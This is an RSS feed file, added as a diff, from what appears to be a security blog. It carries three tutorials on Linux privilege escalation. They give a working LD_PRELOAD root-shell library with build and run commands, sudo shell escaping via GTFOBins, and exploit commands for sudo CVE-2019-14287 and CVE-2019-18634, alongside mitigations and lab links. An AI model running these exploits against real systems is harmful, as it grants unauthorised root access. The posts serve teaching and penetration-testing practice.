@@ -1,0 +1,430 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Sudo on Zerodex Blog</title><link>https://zerodex1.github.io/tags/sudo/</link><description>Recent content in Sudo on Zerodex Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Fri, 24 Jan 2025 13:21:32 +0000</lastBuildDate><atom:link href="https://zerodex1.github.io/tags/sudo/index.xml" rel="self" type="application/rss+xml"/><item><title>LD PRELOAD</title><link>https://zerodex1.github.io/p/ld-preload/</link><pubDate>Fri, 24 Jan 2025 13:21:32 +0000</pubDate><guid>https://zerodex1.github.io/p/ld-preload/</guid><description>&lt;img src="https://zerodex1.github.io/post/ldpco.jpg" alt="Featured image of post LD PRELOAD" />&lt;h2 id="linux-privilege-escalation-using-ld_preload">&lt;strong>Linux Privilege Escalation Using LD_PRELOAD&lt;/strong>
+&lt;/h2>&lt;p>&lt;strong>LD_PRELOAD&lt;/strong> is an environment variable in Linux that allows users to load custom shared libraries before any other libraries during the execution of a program. Attackers can exploit this feature to inject malicious code and potentially escalate privileges, especially if the target program is executed with elevated permissions (e.g., as &lt;code>root&lt;/code>).&lt;/p>
+&lt;h2 id="how-ld_preload-works">&lt;strong>How LD_PRELOAD Works&lt;/strong>
+&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>Purpose&lt;/strong>: LD_PRELOAD is used for debugging or testing by overriding functions in shared libraries.&lt;/li>
+&lt;li>&lt;strong>Mechanism&lt;/strong>: When a program is executed, the dynamic linker checks the LD_PRELOAD variable for a shared library path. If specified, this library is loaded before others, allowing its functions to override standard library functions.&lt;/li>
+&lt;/ol>
+&lt;h2 id="privilege-escalation">Privilege Escalation
+&lt;/h2>&lt;p>&lt;img src="https://zerodex1.github.io/post/ldpreload.png"
+loading="lazy"
+alt="image alt text"
+>&lt;/p>
+&lt;p>Let’s generate a C program file inside the &lt;code>/tmp&lt;/code> directory.&lt;/p>
+&lt;p>&lt;img src="https://1.bp.blogspot.com/-B9yPaw7TbHU/WyKXUU2u8iI/AAAAAAAAXXo/pyxfa1xrXn8Pr1il5ziHSB2ppZ2MQN2AACEwYBhgL/s1600/4.png"
+loading="lazy"
+alt="C Program File Example"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt; &lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/types.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">_init&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">unsetenv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;LD_PRELOAD&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setgid&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setuid&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Save it as &lt;code>shell.c&lt;/code> inside &lt;strong>/tmp&lt;/strong>.&lt;/p>
+&lt;p>&lt;img src="https://3.bp.blogspot.com/-H4g6p2ggbfA/WyKXVJnFfCI/AAAAAAAAXYE/jtgOe57paVYSq5EPS7ddVbVRiOFsP3m8gCEwYBhgL/s1600/5.png"
+loading="lazy"
+alt="Compiling the Shell Program"
+>&lt;/p>
+&lt;p>Next, compile it to generate a shared object with a &lt;code>.so&lt;/code> extension, similar to a &lt;code>.dll&lt;/code> file in the Windows operating system. Enter the following command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Check the generated file:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">ls -al shell.so
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Now execute the &lt;code>find&lt;/code> command with &lt;code>LD_PRELOAD&lt;/code> set to the path of the shared object:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo &lt;span class="nv">LD_PRELOAD&lt;/span>&lt;span class="o">=&lt;/span>/tmp/shell.so find
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>To verify the privileges, run:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">id
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">whoami
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://1.bp.blogspot.com/-SmdjE6lvzUI/WyKXVZ-5akI/AAAAAAAAXYM/ic2oN4QGsc4xmfyDUrwUMmWV0uL5bDntgCEwYBhgL/s1600/6.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>And finally, you should have obtained root privileges! 😉&lt;/p>
+&lt;h2 id="resources-">Resources :
+&lt;/h2>&lt;ul>
+&lt;li>&lt;a class="link" href="https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/" target="_blank" rel="noopener"
+>https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://www.youtube.com/watch?v=bzjnIi5u9OQ" target="_blank" rel="noopener"
+>https://www.youtube.com/watch?v=bzjnIi5u9OQ&lt;/a>&lt;/li>
+&lt;/ul></description></item><item><title>Shell Escaping</title><link>https://zerodex1.github.io/p/shell-escaping/</link><pubDate>Fri, 24 Jan 2025 12:38:00 +0000</pubDate><guid>https://zerodex1.github.io/p/shell-escaping/</guid><description>&lt;img src="https://zerodex1.github.io/post/sudo-lc.jpg" alt="Featured image of post Shell Escaping" />&lt;h1 id="whats-sudo-shell-escaping">What&amp;rsquo;s Sudo Shell Escaping
+&lt;/h1>&lt;p>&lt;strong>Sudo shell escaping&lt;/strong> refers to a technique where a user with limited privileges uses &lt;code>sudo&lt;/code> to bypass restrictions and execute commands as a higher-privileged user, typically root. This can occur if the &lt;code>sudo&lt;/code> configuration (the &lt;code>sudoers&lt;/code> file) allows running commands that invoke a shell or provide shell-like functionality.&lt;/p>
+&lt;h1 id="getting-privilege-escalation">Getting Privilege Escalation
+&lt;/h1>&lt;p>To gain higher privileges using &lt;code>sudo&lt;/code>, follow these steps:&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Check how many commands you can run with &lt;code>sudo&lt;/code> as a low-privilege user:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo -l
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ol>
+&lt;p>&lt;img src="https://zerodex1.github.io/post/sudo-l.png"
+loading="lazy"
+alt="image alt text"
+>&lt;/p>
+&lt;pre>&lt;code>As seen in the image, there are some tools and services that can be run as `sudo`. To make exploitation easier, we can visit this site: [GTFOBins](https://gtfobins.github.io/).
+This site provides a lot of useful information. Let's search for one of these services, such as **Vim**.
+&lt;/code>&lt;/pre>
+&lt;p>&lt;img src="https://zerodex1.github.io/post/gtfbon.png"
+loading="lazy"
+alt="image alt text"
+>&lt;/p>
+&lt;pre>&lt;code>Simply copy the following command and paste it into your target terminal, and you will gain root privileges.
+&lt;/code>&lt;/pre>
+&lt;h1 id="conclusion">Conclusion
+&lt;/h1>&lt;p>In conclusion, sudo shell escaping is a powerful technique that can be exploited to gain unauthorized root access on a system. By identifying commands that can be run with elevated privileges, attackers can leverage tools like GTFOBins to execute malicious payloads and bypass security restrictions. Understanding these offensive methods is crucial for penetration testers and security professionals as they simulate attacks and identify vulnerabilities.&lt;/p></description></item><item><title>Sudo CVEs</title><link>https://zerodex1.github.io/p/sudo-cves/</link><pubDate>Thu, 23 Jan 2025 14:14:48 +0000</pubDate><guid>https://zerodex1.github.io/p/sudo-cves/</guid><description>&lt;img src="https://zerodex1.github.io/post/cvesudo.jpg" alt="Featured image of post Sudo CVEs" />&lt;h1 id="sudo-cves">Sudo CVEs
+&lt;/h1>&lt;p>In this article, we will discuss sudo CVEs, specifically &lt;code>CVE-2019-14287&lt;/code> and &lt;code>CVE-2019-18634&lt;/code>, and how they allow us to achieve sudo privilege escalation on Linux systems.&lt;/p>
+&lt;h2 id="cve-2019-14287">&lt;strong>CVE-2019-14287&lt;/strong>
+&lt;/h2>&lt;p>CVE-2019-14287 is a vulnerability in &lt;code>sudo&lt;/code> that allows a user with restricted privileges to execute arbitrary commands as &lt;strong>root&lt;/strong>, even if they are explicitly denied in the &lt;code>sudoers&lt;/code> file. This occurs due to improper validation of the user ID (&lt;code>UID&lt;/code>) when running commands.&lt;/p>
+&lt;hr>
+&lt;h2 id="details-of-the-vulnerability">&lt;strong>Details of the Vulnerability&lt;/strong>
+&lt;/h2>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Affected Software&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>sudo&lt;/code> versions prior to &lt;strong>1.8.28&lt;/strong>.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Vulnerability Description&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>When &lt;code>sudo&lt;/code> is configured to allow a user to execute commands as any user &lt;strong>except root&lt;/strong> using the &lt;code>!ALL&lt;/code> directive in the &lt;code>sudoers&lt;/code> file, the vulnerability allows bypassing this restriction.&lt;/li>
+&lt;li>The issue arises because &lt;code>sudo&lt;/code> does not properly handle the &lt;code>-1&lt;/code> or &lt;code>4294967295&lt;/code> value for the &lt;code>UID&lt;/code>. Internally, these values are interpreted as &lt;code>0&lt;/code> (root).&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Exploitation&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>A user can exploit this by specifying &lt;code>-u#-1&lt;/code> to execute a command as root, bypassing the restrictions.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h2 id="proof-of-concept-poc">&lt;strong>Proof of Concept (PoC)&lt;/strong>
+&lt;/h2>&lt;h3 id="1-vulnerable-configuration-in-etcsudoers">1. Vulnerable Configuration in &lt;code>/etc/sudoers&lt;/code>:
+&lt;/h3>&lt;p>The following configuration denies a user (&lt;code>exampleuser&lt;/code>) from executing commands as root:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">exampleuser ALL=(ALL,!root) ALL
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="2-exploit-command">2. Exploit Command:
+&lt;/h3>&lt;p>The attacker can bypass the restriction and run commands as root:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo -u#-1 id
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="3-expected-output">3. Expected Output:
+&lt;/h3>&lt;p>The command will execute as root (&lt;code>UID=0&lt;/code>):&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">uid=0(root) gid=0(root) groups=0(root)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;hr>
+&lt;h2 id="impact">&lt;strong>Impact&lt;/strong>
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Privilege Escalation&lt;/strong>: The attacker gains root privileges, bypassing intended restrictions.&lt;/li>
+&lt;li>&lt;strong>Severity&lt;/strong>: High (CVSS Score: 7.8).&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="mitigation">&lt;strong>Mitigation&lt;/strong>
+&lt;/h2>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Update &lt;code>sudo&lt;/code>&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Upgrade to &lt;strong>sudo 1.8.28&lt;/strong> or later, which properly validates &lt;code>UID&lt;/code> values.&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo apt update &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> sudo apt install sudo
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Audit and Restrict sudoers Configuration&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Ensure your &lt;code>sudoers&lt;/code> file does not rely solely on &lt;code>!root&lt;/code> for user restrictions.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Monitor and Log sudo Usage&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Use logs to monitor unusual activity involving &lt;code>sudo&lt;/code>.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h2 id="labs-">Labs :
+&lt;/h2>&lt;ul>
+&lt;li>&lt;a class="link" href="https://tryhackme.com/r/room/sudovulnsbypass" target="_blank" rel="noopener"
+>https://tryhackme.com/r/room/sudovulnsbypass&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h3 id="tryhackme-lab">TryHackMe Lab
+&lt;/h3>&lt;p>Now that we have access to the machine, our next goal is to gain root privileges using the identified vulnerability.&lt;/p>
+&lt;p>First, we use the command &lt;code>sudo -l&lt;/code> to check what commands we can execute with the current user.&lt;/p>
+&lt;p>&lt;img src="https://zerodex1.github.io/post/cves1.png"
+loading="lazy"
+alt="image alt text"
+>&lt;/p>
+&lt;p>After running &lt;code>sudo -l&lt;/code>, we see that we can run &lt;code>/bin/bash&lt;/code> as another user except for root. Let’s exploit this vulnerability.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo -u#-1 /bin/bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://zerodex1.github.io/post/cvs2.png"
+loading="lazy"
+alt="image alt text"
+>&lt;/p>
+&lt;p>And just like that, we are now the root user! :&lt;/p>
+&lt;h3 id="references">&lt;strong>References&lt;/strong>
+&lt;/h3>&lt;ul>
+&lt;li>&lt;a class="link" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287" target="_blank" rel="noopener"
+>MITRE CVE Details&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h2 id="cve-2019-18634">&lt;strong>CVE-2019-18634&lt;/strong>
+&lt;/h2>&lt;p>CVE-2019-18634 is a &lt;strong>buffer overflow vulnerability&lt;/strong> in &lt;code>sudo&lt;/code> that can allow local privilege escalation. It specifically affects &lt;code>sudo&lt;/code> configurations where &lt;strong>pwfeedback&lt;/strong> is enabled, which can result in memory corruption and potentially lead to unauthorized code execution or system crashes.&lt;/p>
+&lt;hr>
+&lt;h2 id="details-of-the-vulnerability-1">&lt;strong>Details of the Vulnerability&lt;/strong>
+&lt;/h2>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Affected Software&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>sudo&lt;/code> versions prior to &lt;strong>1.8.31&lt;/strong>.&lt;/li>
+&lt;li>Only configurations with &lt;strong>pwfeedback&lt;/strong> enabled are affected.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Vulnerability Description&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>The &lt;strong>pwfeedback&lt;/strong> option, which provides visual feedback when typing a password (e.g., asterisks), is susceptible to a buffer overflow.&lt;/li>
+&lt;li>If the input exceeds the buffer size, it overflows, corrupting memory.&lt;/li>
+&lt;li>The issue is exploitable only when the attacker provides their own password input, making it a local attack vector.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Exploitation&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>By triggering the buffer overflow, an attacker can potentially execute arbitrary code or crash the &lt;code>sudo&lt;/code> process.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h2 id="proof-of-concept-poc-1">&lt;strong>Proof of Concept (PoC)&lt;/strong>
+&lt;/h2>&lt;h3 id="1-vulnerable-configuration">1. Vulnerable Configuration:
+&lt;/h3>&lt;p>The &lt;code>/etc/sudoers&lt;/code> file must have &lt;strong>pwfeedback&lt;/strong> enabled:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">Defaults pwfeedback
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="2-exploit-steps">2. Exploit Steps:
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>Use a specially crafted input (e.g., very long password) to overflow the buffer.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>For example:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python3 -c &lt;span class="s2">&amp;#34;print(&amp;#39;A&amp;#39; * 10000)&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> sudo -S id
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>This may result in a segmentation fault or allow further exploitation.&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="3-output">3. Output:
+&lt;/h3>&lt;p>If the system is vulnerable, it could crash with a segmentation fault:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">Segmentation fault (core dumped)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;hr>
+&lt;h2 id="impact-1">&lt;strong>Impact&lt;/strong>
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Privilege Escalation&lt;/strong>: Potential execution of arbitrary code with root privileges.&lt;/li>
+&lt;li>&lt;strong>Denial of Service&lt;/strong>: Crash or instability of the &lt;code>sudo&lt;/code> process.&lt;/li>
+&lt;li>&lt;strong>Severity&lt;/strong>: High (CVSS Score: 7.8).&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="mitigation-1">&lt;strong>Mitigation&lt;/strong>
+&lt;/h2>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Update &lt;code>sudo&lt;/code>&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Upgrade to &lt;code>sudo&lt;/code> version &lt;strong>1.8.31&lt;/strong> or later, where the issue is patched:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo apt update &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> sudo apt install sudo
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Disable pwfeedback&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Ensure the &lt;code>pwfeedback&lt;/code> option is not enabled in &lt;code>/etc/sudoers&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">Defaults !pwfeedback
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Apply Principle of Least Privilege&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Limit sudo access to necessary users and monitor suspicious activity.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h2 id="detection">&lt;strong>Detection&lt;/strong>
+&lt;/h2>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Check sudo Version&lt;/strong>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo --version
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Search for pwfeedback in sudoers&lt;/strong>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo grep pwfeedback /etc/sudoers /etc/sudoers.d/*
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h2 id="labs--1">Labs :
+&lt;/h2>&lt;ul>
+&lt;li>&lt;a class="link" href="https://tryhackme.com/r/room/sudovulnsbof" target="_blank" rel="noopener"
+>https://tryhackme.com/r/room/sudovulnsbof&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h2 id="references-1">&lt;strong>References&lt;/strong>
+&lt;/h2>&lt;ul>
+&lt;li>&lt;a class="link" href="https://www.sudo.ws/alerts/pwfeedback.html" target="_blank" rel="noopener"
+>Sudo Security Advisory&lt;/a>&lt;/li>
